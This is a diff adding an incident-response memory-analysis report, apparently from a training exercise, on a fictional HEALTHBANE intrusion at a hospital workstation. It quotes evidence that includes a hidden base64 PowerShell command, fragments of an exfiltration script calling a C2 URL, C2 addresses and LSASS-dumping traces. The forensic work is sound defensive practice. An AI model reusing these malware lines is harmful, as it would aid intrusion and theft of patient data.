@@ -1,0 +1,480 @@
+============================================================
+TASK 1 - MEMORY ARTIFACT ANALYSIS
+Project: 4x05 Attack Reconstruction
+Host: WS-RECV-03
+Analysis Date: Wed Oct  7 08:15:58 AM EDT 2026
+============================================================
+
+Evidence:
+  Memory: /home/nishat/Desktop/dlh_projects/dlh-cyber_security/threat_detection/4x05_attack_reconstruction/ir_evidence/memory_artifacts.txt
+  IOC DB: /home/nishat/Desktop/dlh_projects/dlh-cyber_security/threat_detection/4x05_attack_reconstruction/reference/healthbane_ioc_master.json
+
+------------------------------------------------------------
+1. EVIDENCE STATISTICS
+------------------------------------------------------------
+Memory artifact lines: 568
+
+------------------------------------------------------------
+2. RUNNING PROCESSES
+------------------------------------------------------------
+
+Potential HEALTHBANE-related process names:
+
+78:3712   624    svchost_update.exe         MEDDEFENSE\records03 2026-04-22 06:15:08   *
+91:                                                              svchost_update.exe
+98:8472   3712   powershell.exe             MEDDEFENSE\records03 2026-05-15 02:00:14   *
+100:                                                              powershell.exe -NoP -W Hidden
+101:                                                              -EncodedCommand <very-long
+105:                                                              Note: this PowerShell child
+106:                                                              of svchost_update.exe ran
+114:                                                              the powershell.exe above)
+160:TCP    10.10.3.21:50214          185.220.101.45:443         ESTABLISHED  3712   svchost_update.exe    [K]
+161:TCP    10.10.3.21:50227          185.220.101.45:443         CLOSE_WAIT   3712   svchost_update.exe    [K]
+162:TCP    10.10.3.21:50299          203.0.113.47:8443          ESTABLISHED  3712   svchost_update.exe    [?]
+178:characterized in 4x01.  It belongs to svchost_update.exe (PID 3712,
+198:PID 3712  svchost_update.exe
+199:   "C:\Users\records03\AppData\Roaming\Microsoft\HealthSync\svchost_update.exe"
+202:PID 8472  powershell.exe   (last execution before isolation)
+203:   "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden
+204:   -EncodedCommand JABjAGYAZwAgAD0AIAAnAGgAdAB0AHAAOgAvAC8AcwB5AG4AYwAuAGgAZQBhAGwAdABoAGIAYQBuAGUALQBjADIALgBuAGUAdAAvAGEAcABpAC8AdgAxAC8AYwBmAGcAJwA7ACAAJgAgACQAZQBuAHYAOgBUAEUATQBQAFwAcwB5AG4AYwBfAGgAZQBhAGwAdABoAGQAYQB0AGEALgBwAHMAMQAgAC0AQwBvAG4AZgBpAGcAIAAkAGMAZgBnAA==
+208:       & $env:TEMP\sync_healthdata.ps1 -Config $cfg
+211:   sync_healthdata.ps1 (4x03 sample S3) was executed on
+216:   directory $env:TEMP\sync_healthdata.ps1 and any output
+227:Process: svchost_update.exe (PID 3712)
+240:Process: powershell.exe (PID 8472)
+241:   No injected regions.  The PowerShell host is the legitimate
+242:   pwsh interpreter.  The script content lives in script blocks
+247:SECTION 6 -- POWERSHELL SCRIPT BLOCKS  (windows.cmdscan + custom plugin)
+251:For PowerShell ISE / pwsh script blocks, we used the Volatility
+252:PowerShell plugin (custom build) and recovered the in-memory script
+257:# === BEGIN sync_healthdata.ps1 (in-memory) ===
+292:# === END sync_healthdata.ps1 ===
+317:Process 3712 svchost_update.exe   (records03)
+321:                                    svchost_update.exe
+361:Process 3712 svchost_update.exe -- module list (filtered to non-Microsoft):
+366:Process 8472 powershell.exe -- module list (filtered to interesting):
+370:   Microsoft.PowerShell.Management.dll
+371:   [...standard PowerShell module set...]
+397:               svchost_update.exe
+420:        a base64-encoded PowerShell command that downloads and
+504:   [4x03 S2]   svchost_update.exe in-memory hash matches sample.    CONFIRMED
+508:   [4x03 S3]   sync_healthdata.ps1 invocation pattern.              CONFIRMED
+
+All process-related lines:
+
+54:SECTION 2 -- PROCESS LIST  (pslist + pstree, abridged)
+57:PID    PPID   Name                       User                Start time (UTC)
+65:792    624    svchost.exe                SYSTEM              2026-04-22 06:14:21
+66:[...standard svchost subtree, redacted for brevity, all signed Microsoft...]
+71:# --- USER-CONTEXT PROCESSES UNDER MEDDEFENSE\records03 ---
+72:6228   1956   explorer.exe               MEDDEFENSE\records03 2026-05-15 13:02:14
+75:[...several chrome.exe child renderer processes, redacted...]
+77:# --- SUSPICIOUS / NON-STANDARD PROCESSES ---
+78:3712   624    svchost_update.exe         MEDDEFENSE\records03 2026-04-22 06:15:08   *
+79:                                                              (NOTE: PPID 624 services.exe
+81:                                                              malfind.  Real parent at
+82:                                                              load was explorer.exe via
+83:                                                              Run-key autorun.  PPID was
+86:                                                              process-hollowing of a
+91:                                                              svchost_update.exe
+98:8472   3712   powershell.exe             MEDDEFENSE\records03 2026-05-15 02:00:14   *
+100:                                                              powershell.exe -NoP -W Hidden
+105:                                                              Note: this PowerShell child
+106:                                                              of svchost_update.exe ran
+114:                                                              the powershell.exe above)
+116:# --- PROCESSES THAT EXITED PRIOR TO CAPTURE ---
+117:# Volatility reports these via psscan / EPROCESS pool tags; the kernel
+118:# preserved the EPROCESS structures because of references held by handles
+119:# from still-living processes.
+129:                                                              its EPROCESS pool tag and handles
+142:(exited)  -    cmd.exe                    MEDDEFENSE\records03 several invocations
+143:                                                              [ANALYST: parent of PsExec64.exe
+158:Proto  LocalAddr:LocalPort       RemoteAddr:RemotePort      State        PID    Process               Flag
+160:TCP    10.10.3.21:50214          185.220.101.45:443         ESTABLISHED  3712   svchost_update.exe    [K]
+161:TCP    10.10.3.21:50227          185.220.101.45:443         CLOSE_WAIT   3712   svchost_update.exe    [K]
+162:TCP    10.10.3.21:50299          203.0.113.47:8443          ESTABLISHED  3712   svchost_update.exe    [?]
+178:characterized in 4x01.  It belongs to svchost_update.exe (PID 3712,
+179:the same RAT process that maintains the known beacon to
+195:SECTION 4 -- PROCESS COMMAND LINES  (cmdline)
+198:PID 3712  svchost_update.exe
+199:   "C:\Users\records03\AppData\Roaming\Microsoft\HealthSync\svchost_update.exe"
+202:PID 8472  powershell.exe   (last execution before isolation)
+203:   "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden
+224:permission and PE/MZ signatures inside processes that should not have
+227:Process: svchost_update.exe (PID 3712)
+240:Process: powershell.exe (PID 8472)
+241:   No injected regions.  The PowerShell host is the legitimate
+247:SECTION 6 -- POWERSHELL SCRIPT BLOCKS  (windows.cmdscan + custom plugin)
+251:For PowerShell ISE / pwsh script blocks, we used the Volatility
+252:PowerShell plugin (custom build) and recovered the in-memory script
+253:text for PID 8472.
+273:$rdr = $cmd.ExecuteReader()
+301:in the heap of PID 8472 contains a residue of the parsed
+317:Process 3712 svchost_update.exe   (records03)
+321:                                    svchost_update.exe
+338:   0x52c   Process     QueryLimited PID 648 (lsass.exe)
+340:                                    process start.  Granted access on this
+341:                                    handle is 0x1000 (PROCESS_QUERY_LIMITED_
+350:   debug_tool.exe -> Process     <0x1010>     PID 648 (lsass.exe)
+353:   [ANALYST: granted-access bitmask 0x1010 = PROCESS_VM_READ |
+354:   PROCESS_QUERY_LIMITED_INFORMATION.  This is the canonical bitmask
+361:Process 3712 svchost_update.exe -- module list (filtered to non-Microsoft):
+366:Process 8472 powershell.exe -- module list (filtered to interesting):
+370:   Microsoft.PowerShell.Management.dll
+371:   [...standard PowerShell module set...]
+375:   No discrepancies in either suspicious process.  This rules out
+397:               svchost_update.exe
+420:        a base64-encoded PowerShell command that downloads and
+479:[CRED-2]  LSASS process at the moment of capture contains:
+504:   [4x03 S2]   svchost_update.exe in-memory hash matches sample.    CONFIRMED
+
+------------------------------------------------------------
+3. NETWORK CONNECTIONS
+------------------------------------------------------------
+
+Network-related evidence:
+
+17:  Reviewed by:           Mike Torres (DFIR peer review)
+28:artifacts, network indicators, credential-access traces.
+47:Domain:             MEDDEFENSE.LOCAL
+50:DNS:                10.10.20.10  (SRV-DC-01)
+148:SECTION 3 -- ACTIVE NETWORK CONNECTIONS  (netscan)
+152:Endpoints sorted by remote address.  Bracketed flag column:
+158:Proto  LocalAddr:LocalPort       RemoteAddr:RemotePort      State        PID    Process               Flag
+160:TCP    10.10.3.21:50214          185.220.101.45:443         ESTABLISHED  3712   svchost_update.exe    [K]
+161:TCP    10.10.3.21:50227          185.220.101.45:443         CLOSE_WAIT   3712   svchost_update.exe    [K]
+162:TCP    10.10.3.21:50299          203.0.113.47:8443          ESTABLISHED  3712   svchost_update.exe    [?]
+163:TCP    10.10.3.21:50301          10.10.20.10:53             TIME_WAIT    -      (kernel)              [B]
+164:TCP    10.10.3.21:139            *:0                        LISTEN       4      System                [L]
+165:TCP    10.10.3.21:445            *:0                        LISTEN       4      System                [L]
+166:TCP    10.10.3.21:50180          10.10.20.40:445            ESTABLISHED  4      System                [B] (file-share to
+169:TCP    10.10.3.21:50203          172.217.14.78:443          ESTABLISHED  6804   chrome.exe            [B] (Google;
+171:TCP    10.10.3.21:50204          157.240.22.35:443          TIME_WAIT    6804   chrome.exe            [B] (Facebook;
+173:UDP    10.10.3.21:5353           *:*                                     -      (mDNS responder)      [L]
+174:UDP    10.10.3.21:138            *:*                                     -      System                [L]
+177:The connection to 203.0.113.47:8443 is NOT one of the C2 endpoints
+180:185.220.101.45:443).  The remote IP resolves to a Hetzner allocation
+181:in Germany.  No DNS query was issued in the last 24h to obtain it,
+185:This connection has been live for an extended period (see firewall
+190:The connection is being treated as a Stage 4 secondary C2.
+207:       $cfg = 'http://sync.healthbane-c2.net/api/v1/cfg';
+260:Invoke-WebRequest -UseBasicParsing -Uri 'http://sync.healthbane-c2.net/api/v1/cfg' `
+269:$sql = New-Object System.Data.SqlClient.SqlConnection $conn
+296:http://sync.healthbane-c2.net/api/v1/cfg.  The config file was
+368:                                    SqlConnection construction)
+401:        2026-04-22.  Confirms persistence has been established for
+459:        require elevation.  records03 was a member of the local
+462:        provisioned with local admin in 2018 and never re-baselined).
+474:            User: dmarsh@MEDDEFENSE.LOCAL    (last logon 2026-04-14 13:18 UTC)
+475:            User: records03@MEDDEFENSE.LOCAL (last logon 2026-05-15 13:02 UTC)
+507:   [4x03 S2]   C2 beacon to 185.220.101.45:443.                     CONFIRMED
+514:   [NEW-1]  Live secondary C2 connection to 203.0.113.47:8443.
+536:              T1005   Data from Local System -> OBSERVED
+540:              T1074.001 Local Data Staging (C:\Users\Public\Tmp\) -> OBSERVED
+550:   [OPEN-1]  How long has the secondary C2 (203.0.113.47:8443) been
+551:             active?  Memory shows the connection is live; firewall
+
+------------------------------------------------------------
+4. IOC CROSS-REFERENCE
+------------------------------------------------------------
+
+The following IOC values were extracted from the IOC database
+and searched for in the memory artifact.
+
+[KNOWN] 185.220.101.45
+  Evidence:
+
+[KNOWN] 2026-04-14
+  Evidence:
+
+[KNOWN] 2026-04-22
+  Evidence:
+
+[KNOWN] 2026-05-05
+  Evidence:
+
+[KNOWN] 2026-05-09
+  Evidence:
+
+[KNOWN] 2026-05-12
+  Evidence:
+
+[KNOWN] 2026-05-13
+  Evidence:
+
+[KNOWN] 4x01
+  Evidence:
+
+[KNOWN] 4x03
+  Evidence:
+
+[KNOWN] 4x04
+  Evidence:
+
+[KNOWN] debug_tool.exe
+  Evidence:
+
+[KNOWN] dmarsh
+  Evidence:
+
+[KNOWN] domain
+  Evidence:
+
+[KNOWN] dropper
+  Evidence:
+
+[KNOWN] exfiltrator
+  Evidence:
+
+[KNOWN] HB-IOC-0015
+  Evidence:
+
+[KNOWN] HEALTHBANE
+  Evidence:
+
+[KNOWN] healthbane-c2.net
+  Evidence:
+
+[KNOWN] HIGH
+  Evidence:
+
+[KNOWN] host
+  Evidence:
+
+[KNOWN] ipv4
+  Evidence:
+
+[KNOWN] PsExec64.exe
+  Evidence:
+
+[KNOWN] sha256
+  Evidence:
+
+[KNOWN] SRV-DC-01
+  Evidence:
+
+[KNOWN] SRV-HEALTH-DB
+  Evidence:
+
+[KNOWN] svc_healthsync
+  Evidence:
+
+[KNOWN] svchost_update.exe
+  Evidence:
+
+[KNOWN] sync.healthbane-c2.net
+  Evidence:
+
+[KNOWN] sync_healthdata.ps1
+  Evidence:
+
+[KNOWN] WS-RECV-03
+  Evidence:
+
+
+------------------------------------------------------------
+5. LOADED MODULES / DLLs
+------------------------------------------------------------
+
+Potential credential-access or security-tool related modules:
+
+25:printkey, dlllist, handles, cmdline, modscan, getsids, ldrmodules) is
+28:artifacts, network indicators, credential-access traces.
+64:648    564    lsass.exe                  SYSTEM              2026-04-22 06:14:20
+96:                                                              [MATCHES 4x03 sample S2 hash]
+125:                                                              [ANALYST: this is the LSASS dumper
+179:the same RAT process that maintains the known beacon to
+211:   sync_healthdata.ps1 (4x03 sample S3) was executed on
+338:   0x52c   Process     QueryLimited PID 648 (lsass.exe)
+343:                                    dump credentials.  The actual LSASS
+350:   debug_tool.exe -> Process     <0x1010>     PID 648 (lsass.exe)
+355:   used by Mimikatz-class LSASS dumpers and matches the 4x04 H4 finding.]
+358:SECTION 8 -- LOADED MODULES  (dlllist + ldrmodules)
+361:Process 3712 svchost_update.exe -- module list (filtered to non-Microsoft):
+362:   None other than the main image and standard system DLLs.  No
+363:   third-party DLLs are loaded.  This is consistent with a stand-alone
+366:Process 8472 powershell.exe -- module list (filtered to interesting):
+367:   System.Data.SqlClient.dll      (.NET, used by the exfiltrator
+369:   System.IO.Compression.dll      (Compress-Archive cmdlet support)
+370:   Microsoft.PowerShell.Management.dll
+371:   [...standard PowerShell module set...]
+373:ldrmodules cross-check (looks for DLLs loaded by manual mapping
+374:that are not in the loader lists -- a sign of reflective DLL injection):
+376:   reflective DLL injection as a credential-access path on
+377:   WS-RECV-03 specifically (it does NOT rule out Mimikatz running
+414:        branch in the 4x03 dropper sample.
+451:        2026-05-04 at 18:11 CDT.  This pre-dates the first credential
+453:        an attacker preparing the host for the LSASS dump.  Exclusion
+466:SECTION 10 -- CACHED CREDENTIALS  (lsadump.cachedump, lsadump.lsa)
+469:WARNING: this section reports artifact PRESENCE, not the credential
+476:            [ANALYST: these are normal cached-domain-credential entries
+479:[CRED-2]  LSASS process at the moment of capture contains:
+484:            [ANALYST: there is no svc_healthsync ticket or hash in LSASS
+487:            on this host.  The credential abuse window from 4x04 had
+488:            already ended; lsass at capture time reflects normal records03
+491:[CRED-3]  Residual evidence of debug_tool.exe access to LSASS:
+493:            two prior LSASS reads occurred (matching 4x04 H4) but the
+494:            extracted material is not present in lsass at capture time
+504:   [4x03 S2]   svchost_update.exe in-memory hash matches sample.    CONFIRMED
+509:   [4x04 H4]   debug_tool.exe LSASS access (handle 0x1010).         CONFIRMED
+
+------------------------------------------------------------
+6. SCHEDULED TASK PERSISTENCE
+------------------------------------------------------------
+
+90:                                                              Roaming\Microsoft\HealthSync\
+98:8472   3712   powershell.exe             MEDDEFENSE\records03 2026-05-15 02:00:14   *
+107:                                                              at 02:00 CDT 2026-05-15, the
+112:8580   8472   conhost.exe                MEDDEFENSE\records03 2026-05-15 02:00:14
+199:   "C:\Users\records03\AppData\Roaming\Microsoft\HealthSync\svchost_update.exe"
+212:   WS-RECV-03 at 02:00 CDT 2026-05-15.  This is a NEW data
+258:$ErrorActionPreference = 'SilentlyContinue'
+267:# Connect using current security context (svc_healthsync via PsExec
+320:                                    AppData\Roaming\Microsoft\HealthSync\
+324:                                    HealthSyncSingleton-h$lthb4n3
+394:        Value: HealthSync
+396:        Data:  C:\Users\records03\AppData\Roaming\Microsoft\HealthSync\
+404:[K2]  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\
+407:        Data:  \HealthSync Update Service
+410:        A scheduled task named "HealthSync Update Service" was
+419:        confirms its existence at capture time.  The task action is
+484:            [ANALYST: there is no svc_healthsync ticket or hash in LSASS
+505:   [4x03 S2]   Run-key persistence (HKCU\...\Run\HealthSync).      CONFIRMED
+506:   [4x03 S2]   Hardcoded mutex HealthSyncSingleton-h$lthb4n3.       CONFIRMED
+519:   [NEW-2]  Scheduled task "HealthSync Update Service" registered
+524:            ATT&CK addition: T1053.005 Scheduled Task (CONFIRMED).
+531:   [NEW-4]  Stage 3 exfiltrator EXECUTED on WS-RECV-03 at 02:00 CDT
+
+ATT&CK Mapping:
+  T1053.005 - Scheduled Task/Job: Scheduled Task
+
+Assessment:
+  Persistence mechanism identified in memory evidence.
+  Verify task name, trigger, action and creation timestamp
+  against disk evidence and previous investigation findings.
+
+------------------------------------------------------------
+7. HEALTHBANE-SPECIFIC INDICATORS
+------------------------------------------------------------
+
+3:  HEALTHBANE Incident Response : Memory Capture and Triage
+78:3712   624    svchost_update.exe         MEDDEFENSE\records03 2026-04-22 06:15:08   *
+90:                                                              Roaming\Microsoft\HealthSync\
+91:                                                              svchost_update.exe
+106:                                                              of svchost_update.exe ran
+153:   [K]  known HEALTHBANE infrastructure (4x01 IOC)
+160:TCP    10.10.3.21:50214          185.220.101.45:443         ESTABLISHED  3712   svchost_update.exe    [K]
+161:TCP    10.10.3.21:50227          185.220.101.45:443         CLOSE_WAIT   3712   svchost_update.exe    [K]
+162:TCP    10.10.3.21:50299          203.0.113.47:8443          ESTABLISHED  3712   svchost_update.exe    [?]
+178:characterized in 4x01.  It belongs to svchost_update.exe (PID 3712,
+187:C2 channel on a non-standard port" mentioned in HC3-2026-HEALTHBANE-004
+198:PID 3712  svchost_update.exe
+199:   "C:\Users\records03\AppData\Roaming\Microsoft\HealthSync\svchost_update.exe"
+207:       $cfg = 'http://sync.healthbane-c2.net/api/v1/cfg';
+208:       & $env:TEMP\sync_healthdata.ps1 -Config $cfg
+211:   sync_healthdata.ps1 (4x03 sample S3) was executed on
+216:   directory $env:TEMP\sync_healthdata.ps1 and any output
+227:Process: svchost_update.exe (PID 3712)
+257:# === BEGIN sync_healthdata.ps1 (in-memory) ===
+260:Invoke-WebRequest -UseBasicParsing -Uri 'http://sync.healthbane-c2.net/api/v1/cfg' `
+267:# Connect using current security context (svc_healthsync via PsExec
+292:# === END sync_healthdata.ps1 ===
+296:http://sync.healthbane-c2.net/api/v1/cfg.  The config file was
+317:Process 3712 svchost_update.exe   (records03)
+320:                                    AppData\Roaming\Microsoft\HealthSync\
+321:                                    svchost_update.exe
+324:                                    HealthSyncSingleton-h$lthb4n3
+326:                                    YARA rule RULE_HEALTHBANE_RAT_PE_v1.
+361:Process 3712 svchost_update.exe -- module list (filtered to non-Microsoft):
+394:        Value: HealthSync
+396:        Data:  C:\Users\records03\AppData\Roaming\Microsoft\HealthSync\
+397:               svchost_update.exe
+407:        Data:  \HealthSync Update Service
+410:        A scheduled task named "HealthSync Update Service" was
+421:        executes a payload from a HealthBane URL.
+484:            [ANALYST: there is no svc_healthsync ticket or hash in LSASS
+504:   [4x03 S2]   svchost_update.exe in-memory hash matches sample.    CONFIRMED
+505:   [4x03 S2]   Run-key persistence (HKCU\...\Run\HealthSync).      CONFIRMED
+506:   [4x03 S2]   Hardcoded mutex HealthSyncSingleton-h$lthb4n3.       CONFIRMED
+508:   [4x03 S3]   sync_healthdata.ps1 invocation pattern.              CONFIRMED
+519:   [NEW-2]  Scheduled task "HealthSync Update Service" registered
+
+------------------------------------------------------------
+8. IP ADDRESSES OBSERVED IN MEMORY
+------------------------------------------------------------
+
+[KNOWN] 10.10.20.10
+
+[NEW] 10.10.20.40
+
+[NEW] 10.10.3.1
+
+[KNOWN] 10.10.3.21
+
+[NEW] 157.240.22.35
+
+[NEW] 172.217.14.78
+
+[KNOWN] 185.220.101.45
+
+[NEW] 203.0.113.47
+
+------------------------------------------------------------
+9. ATT&CK TECHNIQUE SUMMARY
+------------------------------------------------------------
+
+T1053.005 - Scheduled Task/Job: Scheduled Task
+  Evidence source: memory_artifacts.txt
+  Relevance: Possible persistence mechanism
+
+T1059.001 - Command and Scripting Interpreter: PowerShell
+  Evidence source: memory_artifacts.txt if PowerShell activity is present
+
+T1003.001 - OS Credential Dumping: LSASS Memory
+  Evidence source: memory_artifacts.txt if LSASS/credential-access
+  modules or related evidence are observed
+
+T1071.001 - Application Layer Protocol: Web Protocols
+  Evidence source: memory network connections if HTTP/HTTPS C2 is observed
+
+------------------------------------------------------------
+10. FINDING STATUS AND CONFIDENCE
+------------------------------------------------------------
+
+KNOWN:
+  Indicator already exists in the HEALTHBANE IOC database.
+
+NEW:
+  Indicator was observed in memory but is not present in the IOC database.
+  NEW does NOT automatically mean malicious.
+
+MODIFIED:
+  Related to a known indicator but appears as a variant or modified form.
+
+CONFIRMED:
+  Direct evidence supported by at least two independent sources.
+
+PROBABLE:
+  Strong evidence from one source with supporting context.
+
+POSSIBLE:
+  Technique is logically consistent, but evidence is limited or ambiguous.
+
+------------------------------------------------------------
+11. ANALYSIS LIMITATIONS
+------------------------------------------------------------
+
+This script performs initial text-based correlation.
+
+Important:
+  - A NEW IOC is not automatically malicious.
+  - A process name alone does not prove execution by HEALTHBANE.
+  - A loaded DLL alone does not prove credential dumping.
+  - A network connection alone does not prove C2.
+  - Scheduled task evidence should be correlated with disk and
+    previous investigation evidence.
+  - Final CONFIRMED findings require independent supporting evidence.
+
+============================================================
+END OF MEMORY ANALYSIS
+============================================================
